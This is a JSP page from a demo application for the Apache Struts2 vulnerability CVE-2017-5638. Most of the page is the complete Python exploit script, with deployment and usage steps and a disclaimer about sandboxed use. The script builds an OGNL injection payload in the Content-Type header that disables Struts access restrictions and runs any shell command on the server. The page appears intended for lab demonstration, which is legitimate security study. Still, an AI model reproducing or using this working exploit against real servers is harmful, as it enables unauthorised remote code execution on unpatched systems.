<%@ taglib prefix="s" uri="/struts-tags" %>
<html>

<body>
	<h1>CVE-2017-5638 : Struts shock example</h1>
	<br>
	This website demonstrates CVE-2017-5638 vulnerability <br>
	DISCLAIMER : the exploitation of this vulnerability leads to possible arbitraty code execution. <br>
	Uses this site on sandboxed environnement.
	<ol>
		<li>Deploy this war on a Tomcat server</li>
		<li>Create the exploit.py script on the attacker machine</li>
		<li>Run the script : python exploit.py http://localhost:8080/cve-2017-5638-example/helloAction.action "command"</li>
	</ol>
	<br>
	For instance : <br>
	python exploit.py http://localhost:8080/cve-2017-5638-example/helloAction.action "ls -l"
	<br>
	
	<h2>exploit.py</h2>
#!/usr/bin/python <br>
# -*- coding: utf-8 -*- <br>
<br>
# From https://github.com/rapid7/metasploit-framework/issues/8064 <br>
<br>
import urllib2 <br>
import httplib <br>
<br>
<br>
def exploit(url, cmd): <br>
    payload = "%{(#_='multipart/form-data')." <br>
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." <br>
    payload += "(#_memberAccess?" <br>
    payload += "(#_memberAccess=#dm):" <br>
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." <br>
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." <br>
    payload += "(#ognlUtil.getExcludedPackageNames().clear())." <br>
    payload += "(#ognlUtil.getExcludedClasses().clear())." <br>
    payload += "(#context.setMemberAccess(#dm))))." <br>
    payload += "(#cmd='%s')." % cmd <br>
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))." <br>
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))." <br>
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))." <br>
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())." <br>
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))." <br>
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))." <br>
    payload += "(#ros.flush())}" <br>
    <br>	
    try: <br>
        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload} <br>
        request = urllib2.Request(url, headers=headers) <br>
        page = urllib2.urlopen(request).read() <br>
    except httplib.IncompleteRead, e: <br>
        page = e.partial <br>
	<br>
    print(page) <br>
    return page <br>
<br>
<br>
if __name__ == '__main__': <br>
    import sys <br>
    if len(sys.argv) != 3: <br>
        print("[*] struts2_S2-045.py [url] [cmd]")<br>
    else:<br>
        print('[*] CVE: 2017-5638 - Apache Struts2 S2-045')<br>
        url = sys.argv[1]<br>
        cmd = sys.argv[2]<br>
        print("[*] cmd: %s\n" % cmd)<br>
        exploit(url, cmd)<br>
        <p>
</body>
</html>